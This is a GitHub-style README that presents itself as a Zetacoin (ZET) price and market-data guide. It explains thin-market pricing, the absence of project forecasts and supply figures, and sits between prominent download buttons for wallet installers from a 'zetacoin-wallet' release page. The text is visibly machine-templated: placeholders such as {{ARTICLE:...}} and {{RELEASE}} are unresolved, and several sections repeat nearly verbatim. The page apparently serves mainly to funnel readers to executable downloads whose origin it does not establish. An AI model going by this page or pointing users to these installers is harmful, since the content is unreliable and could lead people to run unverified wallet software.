![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Zetacoin Price and Market Data</h1>

<p align="center">Where ZET trades, how the market data is read, and what the record supports.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

Zetacoin's price is thin-market data: it reflects small order books on a handful of venues, not a deep global market. Aggregators publish a figure, but on a low-liquidity pair that figure is an indication rather than a tradable price in size. The project does not publish price targets, forecasts or returns.

## Where the numbers come from

Price aggregators collect trades from the venues that list a coin and compute a weighted figure. For a large market that is close to a real price; for a thin one it is a best guess derived from a small number of trades.

ZET is in the second category. Its pairs trade on smaller venues, volume is low, and a single order can move the quoted price more than any news event.

That is not a criticism of the coin; it is a description of market depth, and it changes what a price figure means.

The full walk-through, with the checks in order, is in [Where to Buy Zetacoin](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/where-to-buy-coins-safely.md).

## Why a thin-market price behaves oddly

A thin order book has wide spreads. The difference between the best bid and the best offer can be a meaningful percentage, which means buying and immediately selling can lose money before any fee.

Prices can also jump without news, because one trade at a poor price becomes the last trade an aggregator sees. And a price can sit unchanged for long periods because nothing traded at all.

| Signal | What it means on a thin market |
| --- | --- |
| Last trade | possibly one small order |
| 24h volume | may be a handful of trades |
| Spread | often wide, especially at size |
| Aggregator price | an indication, not an executable price |

## What the project does with price

Nothing. Zetacoin's public material describes the protocol, the wallet and the network; it does not publish forecasts, target prices or return figures, and a page that did would be inventing them.

The reason is straightforward: a prediction has no basis in the software. Block time, emission and consensus are facts; what a market will pay for them is not.

For the background behind this step, [Zetacoin Exchange List and Trading Pairs](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/exchange-list-and-trading-pairs.md) covers the same ground in more detail.

## Reading market data honestly

Compare like with like: the price on the venue you would actually use, in the pair you would actually trade, at the size you intend. That number matters more than any aggregated figure.

Check the spread before deciding a price is good. Then check that the pair has recent trades, because a listed pair with no volume is decorative.

For a purchase, a limit order at a price you accept is the honest way to interact with a thin book. A market order takes whatever is there, which on a thin book can be far from what the screen showed.

## Supply and why it matters to the number

Circulating supply after the 2022 burn is approximately 59.9 million ZET, with under 50,000 new coins a year from mining and staking. That emission is below a tenth of a percent annually, which means new supply is not a meaningful driver of price in the short term.

The legacy chain's 160 million cap belongs to the retired chain and had already been exceeded before the transition. A figure quoted from that era is not current supply.

## What an investor should know before deciding

This is not advice on what to buy, and the honest content is limited to facts that can be checked: the coin has run since 2013, the chain is maintained, liquidity is thin, and there is no published forecast from the project.

Anyone who needs a forecast to decide is asking a question the project does not answer, and a page that answered it would be guessing with your money.

## Common questions

### What is ZET worth?

It has a market price on the venues that list it, and that price is thin-market data. Check the venue you would use rather than an aggregator headline.

### Why does the price differ between sites?

Different venues, different pairs, small order books. The differences are the market, not an error.

### Does the project publish a forecast?

No. The project publishes protocol facts and leaves market outcomes to the market.

### How many ZET are in circulation?

Approximately 59.9 million after the 2022 burn, with fewer than 50,000 new coins a year.

## The short version

Thin market, indicative prices, wide spreads, and no forecasts from the project. Check the venue you would trade on.

Related pages: {{ARTICLE:is-zetacoin-good-investment}} for the decision framing, {{ARTICLE:where-to-buy-zetacoin}} for the buying route, {{ARTICLE:zetacoin-exchange-list}} for venues, and {{ARTICLE:what-is-zetacoin-cryptocurrency}} for the supply history behind the number. The wallet is on {{RELEASE}}.

## Why the project stays out of it

A protocol page can state block time, emission and supply because those are properties of the code. A market figure is a property of other people's decisions, and a project that published a view on it would be converting a fact sheet into a forecast.

That restraint is deliberate. It means readers get numbers they can check and no numbers they would have to trust, which is the opposite of how most coin pages behave.

## What to compare before acting

Compare the price on the venue you would use, in the pair you would trade, at the size you intend. Then compare the spread, and then the fees on the route.

Those three numbers describe what a trade would actually cost. An aggregated headline describes none of them, which is why it can look attractive while the executable price does not.

## Where supply fits

Circulating supply after the 2022 burn is approximately 59.9 million, with fewer than 50,000 new coins a year. Low emission means new supply is not a short-term driver, which is unusual for a small coin and worth knowing when reading any commentary that assumes dilution.

{{ARTICLE:what-is-zetacoin-cryptocurrency}} covers the supply history, and {{ARTICLE:is-zetacoin-good-investment}} covers the decision framing without a forecast.

## What to do with a quoted price

Use it as a starting point for a limit order, not as a fact about what a trade will cost. On a thin book the difference between the quote and the fill can exceed any fee you will pay.

Then check the pair you would trade and the venue you would use, because the same coin can quote differently in two places for no reason beyond who traded last.

{{ARTICLE:where-to-buy-zetacoin}} covers the route, and {{ARTICLE:zetacoin-exchange-list}} covers the venues where a price is meaningful.

For the buying route itself, {{ARTICLE:where-to-buy-zetacoin}} covers the steps and the two-step cost of a fiat purchase.

The venue question and the price question are the same question asked twice: {{ARTICLE:zetacoin-exchange-list}} answers the first half, and {{ARTICLE:is-zetacoin-still-active-today}} answers the question underneath both.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Is Zetacoin Still Active in 2026?](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/is-the-chain-still-active.md)
- [Where to Buy Zetacoin](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/where-to-buy-coins-safely.md)
- [Is Zetacoin a Good Investment?](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/is-this-a-good-investment.md)
